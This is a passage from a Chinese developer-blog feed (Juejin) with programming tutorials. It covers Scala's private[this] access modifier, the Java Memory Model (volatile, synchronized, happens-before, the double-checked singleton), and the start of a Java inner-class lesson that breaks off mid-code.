<p>private[this] 是 Scala 中最严格的访问权限，限制了成员只能在当前对象实例中访问。</p>
<h3 data-id="heading-17">语法特点</h3>
<ul>
<li>在类的内部可以访问</li>
<li>在类的外部不能访问</li>
<li>在伴生对象中不能访问</li>
<li>在子类中不能访问</li>
</ul>
<h3 data-id="heading-18">示例：private[this] 的严格限制</h3>
<h4 data-id="heading-19">代码</h4>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> level02

<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">base3103</span> </span>{

  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span>(<span class="hljs-params">var name: <span class="hljs-type">String</span>, private var age: <span class="hljs-type">Int</span>, protected var weight: <span class="hljs-type">Int</span></span>) </span>{
    <span class="hljs-keyword">private</span>[<span class="hljs-keyword">this</span>] <span class="hljs-keyword">var</span> pwd = <span class="hljs-number">123</span> <span class="hljs-comment">// 密码</span>
  }

  <span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">Student</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span></span>(student: <span class="hljs-type">Student</span>): <span class="hljs-type">Unit</span> = {
      println(student.age)     <span class="hljs-comment">// 普通的private在伴生对象中可以访问</span>
      <span class="hljs-comment">// println(student.pwd) 报错 （3）在伴生对象中，不能访问private[this]</span>
    }
  }

  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    <span class="hljs-keyword">val</span> s1 = <span class="hljs-keyword">new</span> <span class="hljs-type">Student</span>(<span class="hljs-string">"小花"</span>, <span class="hljs-number">18</span>, <span class="hljs-number">100</span>)
    <span class="hljs-type">Student</span>.test(s1)
  }
}
</code></pre>
<h4 data-id="heading-20">结果展示</h4>
<pre><code class="hljs">18
</code></pre>
<h4 data-id="heading-21">代码分析</h4>
<ul>
<li><code>pwd</code> 字段使用 <code>private[this]</code> 修饰，只能在当前对象实例中访问</li>
<li>在伴生对象 <code>Student</code> 的 <code>test</code> 方法中，可以访问普通的 <code>private var age</code></li>
<li>但访问 <code>student.pwd</code> 会编译报错，体现了 <code>private[this]</code> 在伴生对象中也不可访问</li>
</ul>
<h2 data-id="heading-22">四、案例</h2>
<h3 data-id="heading-23">示例：使用 private[this] 保护账户余额</h3>
<h4 data-id="heading-24">代码</h4>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> level02

<span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">class18</span> </span>{

  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bank</span>(<span class="hljs-params">private[this] var balance: <span class="hljs-type">Double</span></span>) </span>{
    <span class="hljs-comment">// 存钱</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deposit</span></span>(amount: <span class="hljs-type">Double</span>): <span class="hljs-type">Unit</span> = {
      balance += amount
    }
    <span class="hljs-comment">// 取</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">withdraw</span></span>(amount: <span class="hljs-type">Double</span>): <span class="hljs-type">Unit</span> = {
      <span class="hljs-keyword">if</span> (balance &gt;= amount) {
        balance -= amount
      }
    }

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getBalance</span></span>(): <span class="hljs-type">Double</span> = balance
  }

  <span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">Bank</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clear</span></span>(bank: <span class="hljs-type">Bank</span>): <span class="hljs-type">Unit</span> = {
      <span class="hljs-comment">// bank.balance = 0 // 在第11行，添加了private[this] 之后，就不能再直接访问balance属性</span>
    }
  }

  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    <span class="hljs-keyword">val</span> bank = <span class="hljs-keyword">new</span> <span class="hljs-type">Bank</span>(<span class="hljs-number">100</span>)

    bank.deposit(<span class="hljs-number">1000</span>)
    bank.withdraw(<span class="hljs-number">200</span>)

    <span class="hljs-type">Bank</span>.clear(bank)
    println(bank.getBalance())
  }
}
</code></pre>
<h4 data-id="heading-25">结果展示</h4>
<pre><code class="hljs">900
</code></pre>
<h4 data-id="heading-26">代码分析*</h4>
<ul>
<li><code>Bank</code> 类的 <code>balance</code> 使用 <code>private[this]</code> 修饰，确保余额只能在当前对象实例中访问</li>
<li>通过公共方法 <code>deposit</code>、<code>withdraw</code> 和 <code>getBalance</code> 来安全地操作和查询余额</li>
<li>在伴生对象 <code>Bank</code> 的 <code>clear</code> 方法中，直接设置 <code>bank.balance = 0</code> 会编译报错</li>
<li>这种设计确保了账户余额的安全性，防止外部直接修改</li>
</ul>
<h2 data-id="heading-27">总结</h2>
<p>Scala 提供了多层次的访问权限控制，从宽松到严格依次为：</p>
<ol>
<li><strong>protected</strong> - 允许类内部、伴生对象和子类访问</li>
<li><strong>private</strong> - 允许类内部和伴生对象访问</li>
<li><strong>private[this]</strong> - 只允许当前对象实例访问</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[什么是 Java 内存模型（JMM）？]]></title>    <link>https://juejin.cn/post/7575651989986000950</link>    <guid>https://juejin.cn/post/7575651989986000950</guid>    <pubDate>2025-11-24T03:10:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575651989986000950" data-draft-id="7575937594350223403" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="什么是 Java 内存模型（JMM）？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T03:10:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户34584828505"/> <meta itemprop="url" content="https://juejin.cn/user/3710177917545754"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            什么是 Java 内存模型（JMM）？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3710177917545754/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户34584828505
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:10:55.000Z" title="Mon Nov 24 2025 03:10:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Java 内存模型（JMM）定义了线程如何通过内存进行交互，规定所有变量存储在主内存，线程操作需将变量加载到工作内存，修改后写回主内存。核心是解决多线程并发时的原子性、可见性和有序性问题，通过 ​<code>​volatile​</code>​​、​<code>​synchronized​</code>​​ 等关键字和 ​<code>​final​</code>​ 保证线程安全。</p>
<h4 data-id="heading-0">一、JMM 的核心目标</h4>
<p>JMM 的核心目标是 <strong>定义程序中变量的访问规则</strong>，解决多线程并发时的三大核心问题：</p>
<ol>
<li><strong>原子性</strong><br/>
指一个操作是不可分割的整体，要么全部执行，要么全部不执行。</li>
</ol>
<ul>
<li>例：​<code>​i++​</code>​ 并非原子操作（实际包含读取、加 1、写回三步），多线程下可能出现数据丢失。</li>
<li>保证方式：​<code>​synchronized​</code>​、​<code>​Lock​</code>​、​<code>​java.util.concurrent.atomic​</code>​ 原子类。</li>
</ul>
<ol start="2">
<li><strong>可见性</strong><br/>
指一个线程修改的变量值，能被其他线程立即感知到。</li>
</ol>
<ul>
<li>原因：线程操作变量时，会先将主内存的变量加载到自己的 <strong>工作内存</strong>（CPU 缓存），修改后仅更新工作内存，未及时写回主内存，导致其他线程读取到旧值。</li>
<li>保证方式：​<code>​volatile​</code>​（强制写回主内存并 invalidate 其他线程的缓存）、​<code>​synchronized​</code>​、​<code>​final​</code>​。</li>
</ul>
<ol start="3">
<li><strong>有序性</strong><br/>
指程序执行的顺序与代码编写的顺序一致。</li>
</ol>
<ul>
<li>原因：CPU 为优化性能会进行 <strong>指令重排序</strong>（单线程下不影响结果，但多线程下可能破坏依赖关系）。</li>
<li>例：​<code>​int a = 1; int b = 2;​</code>​ 可能被重排为 ​<code>​int b = 2; int a = 1;​</code>​，若另一个线程依赖 ​<code>​a​</code>​ 先赋值，则可能出错。</li>
<li>保证方式：​<code>​volatile​</code>​（禁止重排序）、​<code>​synchronized​</code>​、​<code>​final​</code>​，以及 ​<code>​happens-before​</code>​ 规则。</li>
</ul>
<h4 data-id="heading-1">二、JMM 的内存结构模型</h4>
<p>JMM 抽象了线程与内存的交互关系，将内存分为两类：</p>




















<table><thead><tr><th>内存类型</th><th>作用</th><th>访问方式</th></tr></thead><tbody><tr><td><strong>主内存</strong></td><td>存储所有线程共享的变量（实例变量、静态变量）</td><td>线程需通过工作内存间接访问</td></tr><tr><td><strong>工作内存</strong></td><td>每个线程独有的私有内存（CPU 缓存 + 寄存器）</td><td>线程直接读写，速度快</td></tr></tbody></table>
<h5 data-id="heading-2">线程操作变量的流程：</h5>
<ol>
<li>线程从主内存读取变量到工作内存（<strong>加载 load</strong>）；</li>
<li>线程在工作内存中修改变量（<strong>使用 use</strong>）；</li>
<li>修改后的变量写回主内存（<strong>存储 store</strong>）。</li>
</ol>
<p>⚠️ 问题：多线程并发时，若多个线程同时修改同一变量，可能出现“工作内存数据不一致”（如线程 A 修改变量后未写回，线程 B 仍读取旧值）。</p>
<h4 data-id="heading-3">三、JMM 的核心保障机制</h4>
<p>JMM 通过以下机制保证原子性、可见性和有序性：</p>
<h5 data-id="heading-4">1. ​<code>​volatile​</code>​ 关键字</h5>
<ul>
<li><strong>可见性</strong>：线程修改 ​<code>​volatile​</code>​ 变量后，会立即写回主内存；其他线程读取时，会强制从主内存加载最新值（ invalidate 本地缓存）。</li>
<li><strong>有序性</strong>：禁止 ​<code>​volatile​</code>​ 变量前后的指令重排序（通过内存屏障实现）。</li>
<li>❌ 不保证原子性：例 ​<code>​volatile int i = 0; i++​</code>​ 仍可能出现并发问题（需结合原子类或锁）。</li>
</ul>
<h5 data-id="heading-5">2. ​<code>​synchronized​</code>​ 关键字</h5>
<ul>
<li><strong>原子性</strong>：保证同步块内的操作是原子的（同一时间只有一个线程执行）。</li>
<li><strong>可见性</strong>：线程释放锁时，会将工作内存的修改写回主内存；线程获取锁时，会从主内存加载最新变量值。</li>
<li><strong>有序性</strong>：同步块内的指令禁止重排序（锁的获取和释放相当于内存屏障）。</li>
</ul>
<h5 data-id="heading-6">3. ​<code>​final​</code>​ 关键字</h5>
<ul>
<li><strong>可见性</strong>：​<code>​final​</code>​ 变量初始化后，其值不能被修改（基本类型）或引用不能被重新赋值（引用类型），且初始化完成后立即对其他线程可见（禁止重排序初始化过程）。</li>
<li>例：​<code>​final int a = 10;​</code>​ 其他线程读取 ​<code>​a​</code>​ 时，一定能看到 ​<code>​10​</code>​，不会出现“半初始化”状态。</li>
</ul>
<h5 data-id="heading-7">4. ​<code>​happens-before​</code>​ 规则（JMM 的核心）</h5>
<p>​<code>​happens-before​</code>​ 是 JMM 定义的 <strong>先行发生关系</strong>，用于判断多线程操作的可见性和有序性。若操作 A ​<code>​happens-before​</code>​ 操作 B，则 A 的结果对 B 可见，且 A 的执行顺序在 B 之前。</p>
<p>常用 ​<code>​happens-before​</code>​ 规则：</p>
<ol>
<li><strong>程序顺序规则</strong>：同一线程内，代码按编写顺序执行（前序操作 ​<code>​happens-before​</code>​ 后续操作）。</li>
<li><strong>volatile 规则</strong>：​<code>​volatile​</code>​ 变量的写操作 ​<code>​happens-before​</code>​ 后续的读操作。</li>
<li><strong>锁规则</strong>：锁的释放操作 ​<code>​happens-before​</code>​ 后续的获取锁操作。</li>
<li><strong>线程启动规则</strong>：​<code>​Thread.start()​</code>​ ​<code>​happens-before​</code>​ 线程内的任何操作。</li>
<li><strong>线程终止规则</strong>：线程内的所有操作 ​<code>​happens-before​</code>​ 线程的终止检测（如 ​<code>​Thread.join()​</code>​ 完成）。</li>
</ol>
<h4 data-id="heading-8">四、JMM 的实际应用场景</h4>
<p>JMM 是并发编程的基础，所有 Java 并发工具（如 ​<code>​ThreadPoolExecutor​</code>​、​<code>​ConcurrentHashMap​</code>​）都依赖 JMM 保证线程安全。</p>
<h5 data-id="heading-9">典型场景：</h5>
<ol>
<li><strong>状态标志位</strong>：用 ​<code>​volatile boolean flag​</code>​ 作为线程中断或状态切换的标志（保证可见性和有序性）。</li>
<li><strong>单例模式</strong>：双重检查锁单例（​<code>​volatile​</code>​ 禁止实例初始化的重排序，避免拿到“半初始化”对象）。</li>
</ol>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Singleton instance; <span class="hljs-comment">// volatile 关键</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Singleton</span>()</span> {}
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title">getInstance</span>()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) { <span class="hljs-comment">// 第一次检查</span>
            synchronized (Singleton.<span class="hljs-keyword">class</span>) {
                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) { <span class="hljs-comment">// 第二次检查</span>
                    instance = <span class="hljs-keyword">new</span> Singleton(); <span class="hljs-comment">// 禁止重排序</span>
                }
            }
        }
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
<ol>
<li><strong>并发数据更新</strong>：用 ​<code>​synchronized​</code>​ 或 ​<code>​Lock​</code>​ 保证多线程更新共享变量的原子性和可见性。</li>
</ol>
<h4 data-id="heading-10">总结</h4>
<p>JMM 的核心是 <strong>解决多线程并发时的内存可见性、原子性和有序性问题</strong>，通过抽象主内存和工作内存的交互，以及 ​<code>​volatile​</code>​、​<code>​synchronized​</code>​、​<code>​final​</code>​ 和 ​<code>​happens-before​</code>​ 规则，为 Java 并发编程提供统一的内存模型规范。理解 JMM 是掌握并发编程的基础，也是面试中的高频考点。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Day15 | Java内部类详解]]></title>    <link>https://juejin.cn/post/7575533124878352411</link>    <guid>https://juejin.cn/post/7575533124878352411</guid>    <pubDate>2025-11-24T03:11:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575533124878352411" data-draft-id="7575742632333426738" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Day15 | Java内部类详解"/> <meta itemprop="keywords" content="后端,Java,Java EE"/> <meta itemprop="datePublished" content="2025-11-24T03:11:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="懒惰蜗牛"/> <meta itemprop="url" content="https://juejin.cn/user/615342556327752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Day15 | Java内部类详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/615342556327752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    懒惰蜗牛
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:11:15.000Z" title="Mon Nov 24 2025 03:11:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto;border:3px solid rgba(62,175,124,.2)}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-weight:700;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:6px;border:2px solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c}.markdown-body a:active,.markdown-body a:hover{border-bottom:1.5px solid #3eaf7c}.markdown-body a:before{content:"⇲"}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(62,175,124,.2)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:.5rem solid;border-color:#42b983;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none}.markdown-body ul li:before{content:"•";margin-right:4px;color:#3eaf7c}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、什么是内部类</h2>
<p>内部类是定义在另一个类内部的类，它可以直接访问外部类的所有成员（包括私有成员），是实现封装、回调和高内聚设计的核心语法。</p>
<p>Java里面不仅可以在文件里定义类，还可以在类里嵌套类，这种就是内部类。</p>
<p>这种设计主要是为了解决一些实际问题，比如：</p>
<p>某个类只为另一个类服务时，不暴露它的存在；</p>
<p>表达逻辑更紧耦的协作关系；</p>
<p>实现更优雅的回调、观察者、迭代器等模式；</p>
<p>代替多继承带来的复杂性。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.lazy.snail.day15;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@ClassName</span> Outer
 * <span class="hljs-doctag">@Description</span> TODO
 * <span class="hljs-doctag">@Author</span> lazysnail
 * <span class="hljs-doctag">@Date</span> 2025/5/29 9:21
 * <span class="hljs-doctag">@Version</span> 1.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer</span> {
